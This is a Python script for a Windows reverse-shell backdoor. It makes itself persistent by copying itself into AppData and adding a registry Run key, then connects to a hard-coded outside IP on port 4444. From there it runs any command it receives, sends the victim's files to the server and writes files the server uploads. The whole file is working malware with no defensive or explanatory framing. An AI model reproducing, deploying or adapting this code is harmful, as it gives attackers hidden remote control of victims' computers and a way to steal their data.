import shutil, sys, time, subprocess, os, socket, base64


def shell(server_ip, server_port, data_size):
    path = os.environ['appdata'] + '\\main.ps1'
    if not os.path.exists(path):
        shutil.copyfile(sys.executable, path)
        subprocess.call(
            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d "' + path + '"',
            shell=True)

    try:
        time.sleep(10)
        print("Waiting for connection ...")
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, server_port))
        print("Connection was successful!")
    except Exception as e:
        print("Error:", e)
        return main()

    while True:
        try:
            cmd = client_socket.recv(data_size).decode()
            if not cmd:
                main()
            print(cmd)
            if cmd.lower() in ['q', 'x', 'exit', 'quit', '', ' ']:
                print("Disconnected")
                break
            elif cmd[:2] == 'cd' and len(cmd) > 3:
                os.chdir(cmd[3:])
                client_socket.send(os.getcwd().encode())
            elif cmd in ['powershell', 'cmd']:
                print("Reconnecting ...")
                main()
            elif cmd.startswith('download'):
                filename = cmd[9:]
                with open(filename, 'rb') as file_:
                    file_data = file_.read()
                encoded_data = base64.b64encode(file_data)
                client_socket.send(encoded_data)
            elif cmd.startswith('upload'):
                filename = cmd[7:]
                encoded_data = client_socket.recv(data_size * 100)
                file_data = base64.b64decode(encoded_data)
                with open(filename, 'wb') as file_:
                    file_.write(file_data)
            else:
                popen_func = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                              stdin=subprocess.PIPE)
                output = popen_func.stdout.read() + popen_func.stderr.read()
                client_socket.send(output)
        except Exception as e:
            print("Error:", e)
            main()

    client_socket.close()


def main():
    server_ip = '45.56.120.65'  # Example server IP
    server_port = 4444  # Example server port
    data_size = 1024  # Example data size
    shell(server_ip, server_port, data_size)


print("Running ...")
if __name__ == '__main__':
    main()
